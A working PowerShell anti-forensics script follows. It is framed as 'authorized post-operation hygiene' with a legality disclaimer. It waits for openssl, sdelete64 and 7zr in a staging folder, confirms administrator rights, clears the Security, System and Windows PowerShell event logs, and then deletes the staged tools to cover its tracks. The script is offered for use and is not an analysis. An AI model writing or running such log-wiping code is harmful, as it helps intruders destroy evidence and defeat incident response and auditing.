<#
.SYNOPSIS
    Cleanup script for authorized post-operation hygiene.
.DESIGNATION
    USE ONLY WITH AUTHORIZATION - Destroying security logs may be illegal.
.NOTES
    Requires Administrator privileges. Tests environment before destructive actions.
#>

$dir = "C:\1\"
$filesToDel = @("openssl.exe", "sdelete64.exe", "7zr.exe")
$cleanupDelaySeconds = 300  # 5 min timeout

# Track start time for timeout protection
$startTime = Get-Date
$timeoutReached = $false

# Wait for tools to be present (with timeout)
while (-not $timeoutReached) {
    $filesExist = $true

    foreach ($file in $filesToDel) {
        $filePath = Join-Path -Path $dir -ChildPath $file
        if (-not (Test-Path -Path $filePath)) {
            $filesExist = $false
            break
        }
    }

    if ($filesExist) {
        break
    }

    # Check timeout
    $elapsed = (New-TimeSpan -Start $startTime -End (Get-Date)).TotalSeconds
    if ($elapsed -gt $cleanupDelaySeconds) {
        $timeoutReached = $true
        Write-Warning "Timeout reached. Tools not found. Aborting cleanup."
        exit 1
    }

    Start-Sleep -Seconds 5
}

if (-not $filesExist) {
    Write-Host "[INFO] Skipping cleanup - tools not deployed"
    exit 0
}

Write-Host "[INFO] Starting cleanup sequence..."

# Verify privileges
$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
if (-not $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Error "[ERROR] Administrator privileges required. Aborting."
    exit 1
}

# Clear event logs (note: may fail without proper privileges)
$logNames = @("Security", "Windows PowerShell", "System")
foreach ($log in $logNames) {
    try {
        Clear-EventLog -LogName $log -ErrorAction Stop
        Write-Host "[OK] Cleared $log log"
    } catch {
        Write-Warning "[WARN] Could not clear $log log: $($_.Exception.Message)"
    }
}

# Self-destruct (remove tool files)
foreach ($file in $filesToDel) {
    $filePath = Join-Path -Path $dir -ChildPath $file
    if (Test-Path $filePath) {
        try {
            Remove-Item -Force -Path $filePath
            Write-Host "[OK] Removed $file"
        } catch {
            Write-Warning "[WARN] Could not remove $file"
        }
    }
}

Write-Host "[INFO] Cleanup complete."
exit 0
